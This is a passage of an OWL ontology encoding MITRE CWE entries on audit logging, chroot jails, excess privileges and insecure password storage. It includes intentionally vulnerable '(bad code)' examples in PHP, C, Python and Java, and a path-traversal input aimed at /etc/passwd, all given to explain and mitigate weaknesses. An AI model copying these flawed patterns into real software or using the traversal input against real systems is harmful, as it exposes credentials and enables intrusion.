     Annotations: rdfs:comment "Tigris remote access server before 11.5.4.22 does not properly record Radius accounting information when a user fails the initial login authentication but subsequently succeeds."^^xsd:string
                 
                 references  CVE-2000-0542,
     
     Annotations: rdfs:comment "Trend Micro InterScan VirusWall for Windows NT 3.52 does not record the sender's IP address in the headers for a mail message when it is passed from VirusWall to the MTA, which allows remote attackers to hide the origin of the message."^^xsd:string
                 
                 references  CVE-2002-1839,
     ID  "223"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The source of an attack will be difficult or impossible to determine. This can allow attacks to the system to continue without notice."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This code logs suspicious multiple login attempts.

(bad code)
Example Language: PHP 
function login($userName,$password){
if(authenticate($userName,$password)){
return True;
}
else{
incrementLoginAttempts($userName);
if(recentLoginAttempts($userName) > 5){
writeLog(\"Failed login attempt by User: \" . $userName . \" at \" + date('r') );
} } }
This code only logs failed login attempts when a certain limit is reached. If an attacker knows this limit, they can stop their attack from being discovered by avoiding the limit."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     non-repudiation  "Gain Privileges or Assume Identity"^^xsd:string,
     non-repudiation  "Hide Activities"^^xsd:string,
     operation  ""^^xsd:string
    
    
Individual: CWE-224_Obscured_Security-relevant_Information_by_Alternate_Name

    Annotations: 
        rdfs:comment "The software records security-relevant information according to an alternate name of the affected entity, instead of the canonical name."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1009_Audit,
     
     Annotations: rdfs:comment "NTFS file system in Windows NT 4.0 and Windows 2000 SP2 allows local attackers to hide file usage activities via a hard link to the target file, which causes the link to be recorded in the audit trail instead of the target file."^^xsd:string
                 
                 references  CVE-2002-0725,
     ID  "224"^^xsd:positiveInteger,
     architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "This code prints the contents of a file if a user has permission.

(bad code)
Example Language: PHP 
function readFile($filename){
$user = getCurrentUser();
$realFile = $filename;

//resolve file if its a symbolic link 
if(is_link($filename)){
$realFile = readlink($filename);
}

if(fileowner($realFile) == $user){
echo file_get_contents($realFile);
return;
}
else{
echo 'Access denied';
writeLog($user . ' attempted to access the file '. $filename . ' on '. date('r'));
}
}
While the code logs a bad access attempt, it logs the user supplied name for the file, not the canonicalized file name. An attacker can obscure their target by giving the script the name of a link to the file they are attempting to access. Also note this code contains a race condition between the is_link() and readlink() functions (CWE-363)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string
    
    
Individual: CWE-243_Creation_of_chroot_Jail_Without_Changing_Working_Directory

    Annotations: 
        rdfs:comment "Affected Resources:
File or Directory"^^xsd:string,
        rdfs:comment "Background Details:
The chroot() system call allows a process to change its perception of the root directory of the file system. After properly invoking chroot(), a process cannot access any files outside the directory tree defined by the new root directory. Such an environment is called a chroot jail and is commonly used to prevent the possibility that a processes could be subverted and used to access unauthorized files. For instance, many FTP servers run in chroot jails to prevent an attacker who discovers a new vulnerability in the server from being able to download the password file or other sensitive files on the system."^^xsd:string,
        rdfs:comment "Improper use of chroot() may allow attackers to escape from the chroot jail. The chroot() function call does not change the process's current working directory, so relative paths may still refer to file system resources outside of the chroot jail after chroot() has been called."^^xsd:string,
        rdfs:comment "The program uses the chroot() system call to create a jail, but does not change the working directory afterward. This does not prevent access to files outside of the jail."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1015_Limit_Access,
     ID  "243"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Consider the following source code from a (hypothetical) FTP server:

(bad code)
Example Language: C 
chroot(\"/var/ftproot\");
...
fgets(filename, sizeof(filename), network);
localfile = fopen(filename, \"r\");
while ((len = fread(buf, 1, sizeof(buf), localfile)) != EOF) {
fwrite(buf, 1, sizeof(buf), network);
}
fclose(localfile);
This code is responsible for reading a filename from the network, opening the corresponding file on the local machine, and sending the contents over the network. This code could be used to implement the FTP GET command. The FTP server calls chroot() in its initialization routines in an attempt to prevent access to files outside of /var/ftproot. But because the server does not change the current working directory by calling chdir(\"/\"), an attacker could request the file \"../../../../../etc/passwd\" and obtain a copy of the system password file."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 languages  "C"^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 languages  "C++"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 operating_system  "Unix"^^xsd:string,
     
     Annotations: rdfs:comment "where the weakness is typically related to the presence of some other weaknesses"^^xsd:string
                 
                 weakness_ordinalities  "Resultant"^^xsd:string
    
    
Individual: CWE-250_Execution_with_Unnecessary_Privileges

    Annotations: 
        rdfs:comment "New weaknesses can be exposed because running with extra privileges, such as root or Administrator, can disable the normal security checks being performed by the operating system or surrounding environment. Other pre-existing weaknesses can turn into security vulnerabilities if they occur while operating at raised privileges.

Privilege management functions can behave in some less-than-obvious ways, and they have different quirks on different platforms. These inconsistencies are particularly pronounced if you are transitioning from one non-root user to another. Signal handlers and spawned processes run at the privilege of the owning process, so if a process is running as root when a signal fires or a sub-process is executed, the signal handler or sub-process will operate with root privileges."^^xsd:string,
        rdfs:comment "The software performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1015_Limit_Access,
     
     Annotations: rdfs:comment "Installation script installs some programs as setuid when they shouldn't be."^^xsd:string
                 
                 references  CVE-2007-3931,
     
     Annotations: rdfs:comment "FTP client program on a certain OS runs with setuid privileges and has a buffer overflow. Most clients do not need extra privileges, so an overflow is not a vulnerability for those clients."^^xsd:string
                 
                 references  CVE-2007-4217,
     
     Annotations: rdfs:comment "OS incorrectly installs a program with setuid privileges, allowing users to gain privileges."^^xsd:string
                 
                 references  CVE-2007-5159,
     
     Annotations: rdfs:comment "Program does not drop privileges before calling another program, allowing code execution."^^xsd:string
                 
                 references  CVE-2008-0162,
     
     Annotations: rdfs:comment "setuid root program allows creation of arbitrary files through command line argument."^^xsd:string
                 
                 references  CVE-2008-0368,
     
     Annotations: rdfs:comment "Program runs with privileges and calls another program with the same privileges, which allows read of arbitrary files."^^xsd:string
                 
                 references  CVE-2008-1877,
     
     Annotations: rdfs:comment "Composite: application running with high privileges allows user to specify a restricted file to process, which generates a parsing error that leaks the contents of the file."^^xsd:string
                 
                 references  CVE-2008-4638,
     
     Annotations: rdfs:comment "Cross Zone Scripting"^^xsd:string
                 
                 related_attack_patterns  CAPEC-104,
     
     Annotations: rdfs:comment "Expanding Control over the Operating System from the Database"^^xsd:string
                 
                 related_attack_patterns  CAPEC-470,
     
     Annotations: rdfs:comment "Target Programs with Elevated Privileges"^^xsd:string
                 
                 related_attack_patterns  CAPEC-69,
     ID  "250"^^xsd:positiveInteger,
     access_control  "DoS: Crash, Exit, or Restart"^^xsd:string,
     access_control  "Execute Unauthorized Code or Commands"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "If an application has this design problem, then it can be easier for the developer to make implementation-related errors such as CWE-271 (Privilege Dropping / Lowering Errors). In addition, the consequences of Privilege Chaining (CWE-268) can become more severe."^^xsd:string, 
                 rdfs:comment "Strategy: Attack Surface Reduction
Identify the functionality that requires additional privileges, such as access to privileged operating system resources. Wrap and centralize this functionality if possible, and isolate the privileged code as much as possible from other code [REF-76]. Raise privileges as late as possible, and drop them as soon as possible to avoid CWE-271. Avoid weaknesses such as CWE-288 and CWE-420 by protecting all possible communication channels that could interact with the privileged code, such as a secondary socket that is only intended to be accessed by administrators."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening
Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Separation of Privilege
Identify the functionality that requires additional privileges, such as access to privileged operating system resources. Wrap and centralize this functionality if possible, and isolate the privileged code as much as possible from other code [REF-76]. Raise privileges as late as possible, and drop them as soon as possible to avoid CWE-271. Avoid weaknesses such as CWE-288 and CWE-420 by protecting all possible communication channels that could interact with the privileged code, such as a secondary socket that is only intended to be accessed by administrators."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
Attack Modeling
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Gain Privileges or Assume Identity"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "An attacker will be able to gain access to any resources that are allowed by the extra privileges. Common results include executing code, disabling services, and reading restricted data."^^xsd:string, 
                 rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "DoS: Crash, Exit, or Restart"^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This code temporarily raises the program's privileges to allow creation of a new user folder.

(bad code)
Example Language: Python 
def makeNewUserDir(username):
if invalidUsername(username):

#avoid CWE-22 and CWE-78 
print('Usernames cannot contain invalid characters')
return False

try:
raisePrivileges()
os.mkdir('/home/' + username)
lowerPrivileges()

except OSError:
print('Unable to create new user directory for user:' + username)
return False

return True
While the program only raises its privilege level to create the folder and immediately lowers it again, if the call to os.mkdir() throws an exception, the call to lowerPrivileges() will not occur. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur."^^xsd:string, 
                 rdfs:comment "Example 2
The following code calls chroot() to restrict the application to a subset of the filesystem below APP_HOME in order to prevent an attacker from using the program to gain unauthorized access to files located elsewhere. The code then opens a file specified by the user and processes the contents of the file.

(bad code)
Example Language: C 
chroot(APP_HOME);
chdir(\"/\");
FILE* data = fopen(argv[1], \"r+\");
...
Constraining the process inside the application's home directory before opening any files is a valuable security measure. However, the absence of a call to setuid() with some non-zero value means the application is continuing to operate with unnecessary root privileges. Any successful exploit carried out by an attacker against the application can now result in a privilege escalation attack because any malicious operations will be performed with the privileges of the superuser. If the application drops to the privilege level of a non-root user, the potential for damage is substantially reduced."^^xsd:string, 
                 rdfs:comment "Example 3
This application intends to use a user's location to determine the timezone the user is in:

(bad code)
Example Language: Java 
locationClient = new LocationClient(this, this, this);
locationClient.connect();
Location userCurrLocation;
userCurrLocation = locationClient.getLastLocation();
setTimeZone(userCurrLocation);
This is unnecessary use of the location API, as this information is already available using the Android Time API. Always be sure there is not another way to obtain needed information before resorting to using the location API."^^xsd:string, 
                 rdfs:comment "Example 4
This code uses location to determine the user's current US State location.

First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:

(bad code)
Example Language: XML 
<uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>
During execution, a call to getLastLocation() will return a location based on the application's location permissions. In this case the application has permission for the most accurate location possible:

(bad code)
Example Language: Java 
locationClient = new LocationClient(this, this, this);
locationClient.connect();
Location userCurrLocation;
userCurrLocation = locationClient.getLastLocation();
deriveStateFromCoords(userCurrLocation);
While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Automated Results Interpretation:
According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Host-based Vulnerability Scanners – Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
Attach the monitor to the process and perform a login. Look for library functions and system calls that indicate when privileges are being raised or dropped. Look for accesses of resources that are restricted to normal users.
Note: Note that this technique is only useful for privilege issues related to system resources. It is not likely to detect application-level business rules that are related to privileges, such as if a blog system allows a user to delete a blog entry without first checking that the user has administrator privileges."^^xsd:string
                 
                 dynamic  "black box"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation:
According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Host Application Interface Scanner
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "If circumstances force you to run with extra privileges, then determine the minimum access level necessary. First identify the different permissions that the software and its users will need to perform their actions, such as file read and write permissions, network socket permissions, and so forth. Then explicitly allow those actions while denying all else [REF-76]. Perform extensive input validation and canonicalization to minimize the chances of introducing a separate vulnerability. This mitigation is much more prone to error than dropping the privileges in the first place."^^xsd:string, 
                 rdfs:comment "Perform extensive input validation for any privileged code that must be exposed to the user and reject anything that does not fit your strict requirements."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "When dropping privileges, ensure that they have been dropped successfully to avoid CWE-273. As protection mechanisms in the environment get stronger, privilege-dropping calls may fail even if it seems like they would always succeed."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     installation  ""^^xsd:string,
     integrity  "DoS: Crash, Exit, or Restart"^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
Note: These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string
                 
                 manual_analysis  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening

Ensure that the software runs properly under the Federal Desktop Core Configuration (FDCC) [REF-199] or an equivalent hardening configuration guide, which many organizations use to limit the attack surface and potential risk of deployed software."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string
                 
                 operation  ""^^xsd:string,
     paradigms  "Mobile"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode:
According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Compare binary / bytecode to application permission manifest
Cost effective for partial coverage:
Bytecode Weakness Analysis - including disassembler + source code weakness analysis
Binary Weakness Analysis - including disassembler + source code weakness analysis
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code:
According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Source code Weakness Analyzer
Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis:
According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Configuration Checker
Permission Manifest Analysis
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode:
According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code:
According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Manual Source Code Review (not inspections)
Cost effective for partial coverage:
Focused Manual Spotcheck - Focused manual analysis of source
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening

Ensure that the software runs properly under the Federal Desktop Core Configuration (FDCC) [REF-199] or an equivalent hardening configuration guide, which many organizations use to limit the attack surface and potential risk of deployed software."^^xsd:string
                 
                 system_configuration  ""^^xsd:string
    
    
Individual: CWE-256_Unprotected_Storage_of_Credentials

    Annotations: 
        rdfs:comment "Password management issues occur when a password is stored in plaintext in an application's properties or configuration file. Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource."^^xsd:string,
        rdfs:comment "Storing a password in plaintext may result in a system compromise."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "256"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Avoid storing passwords in easily accessible locations."^^xsd:string, 
                 rdfs:comment "Consider storing cryptographic hashes of passwords as an alternative to storing in plaintext.
A programmer might attempt to remedy the password management problem by obscuring the password with an encoding function, such as base 64 encoding, but this effort does not adequately protect the password because the encoding can be detected and decoded easily.
Effectiveness: None"^^xsd:string, 
                 rdfs:comment "Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this belief makes an attacker's job easier."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following code reads a password from a properties file and uses the password to connect to a database.

(bad code)
Example Language: Java 
...
Properties prop = new Properties();
prop.load(new FileInputStream(\"config.properties\"));
String password = prop.getProperty(\"password\");
DriverManager.getConnection(url, usr, password);
...
This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system."^^xsd:string, 
                 rdfs:comment "Example 2
The following code reads a password from the registry and uses the password to create a new network credential.

(bad code)
Example Language: Java 
...
String password = regKey.GetValue(passKey).toString();
NetworkCredential netCred = new NetworkCredential(username,password,domain);
...
This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system"^^xsd:string, 
                 rdfs:comment "Example 3
The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in plaintext.

This Java example shows a properties file with a plaintext username / password pair.

(bad code)
Example Language: Java 

# Java Web App ResourceBundle properties file 
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...
The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in plaintext.

(bad code)
Example Language: ASP.NET 
...
<connectionStrings>
<add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" />
</connectionStrings>
...
Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-260 and CWE-13."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-257_Storing_Passwords_in_a_Recoverable_Format

    Annotations: 
        rdfs:comment "Maintenance
The meaning of this node needs to be investigated more closely, especially with respect to what is meant by \"recoverable.\""^^xsd:string,
        rdfs:comment "The storage of passwords in a recoverable format makes them subject to password reuse attacks by malicious users. In fact, it should be noted that recoverable encrypted passwords provide no significant benefit over plaintext passwords since they are subject not only to reuse by malicious attackers but also by malicious insiders. If a system administrator can recover a password directly, or use a brute force search on the available information, the administrator can use the password on other accounts."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Password Brute Forcing"^^xsd:string
                 
                 related_attack_patterns  CAPEC-49,
     ID  "257"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Revealed passwords may be reused elsewhere to impersonate the users in question."^^xsd:string, 
                 rdfs:comment "User's passwords may be revealed."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Use strong, non-reversible encryption to protect stored passwords."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "User's passwords may be revealed."^^xsd:string
                 
                 confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
Both of these examples verify a password by comparing it to a stored compressed version.

(bad code)  /* Example Language: C  */ 
int VerifyAdmin(char *password) {
if (strcmp(compress(password), compressed_password)) {
printf(\"Incorrect Password!\\n\");
return(0);
}
printf(\"Entering Diagnostic Mode...\\n\");
return(1);
}
(bad code)
Example Language: Java 
int VerifyAdmin(String password) {
if (passwd.Equals(compress(password), compressed_password)) {
return(0);
}
//Diagnostic Mode 
return(1);
}
Because a compression algorithm is used instead of a one way hashing algorithm, an attacker can recover compressed passwords stored in the database."^^xsd:string, 
                 rdfs:comment "Example 2
The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in plaintext.

This Java example shows a properties file with a plaintext username / password pair.

(bad code)
Example Language: Java 

# Java Web App ResourceBundle properties file 
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...
The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in plaintext.

(bad code)
Example Language: ASP.NET 
...
<connectionStrings>
<add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" />
</connectionStrings>
...
Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-260 and CWE-13."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-258_Empty_Password_in_Configuration_File

    Annotations: 
        rdfs:comment "Using an empty string as a password is insecure."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     ID  "258"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but the password is provided as an empty string.

This Java example shows a properties file with an empty password string.

Example Language: Java  /*(bad code)*/

# Java Web App ResourceBundle properties file 
...
webapp.ldap.username=secretUsername
webapp.ldap.password=
...
The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database and the password is provided as an empty string.

Example Language: ASP.NET  /*(bad code)*/
...
<connectionStrings>
<add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=; dbalias=uDB;\" providerName=\"System.Data.Odbc\" />
</connectionStrings>
...
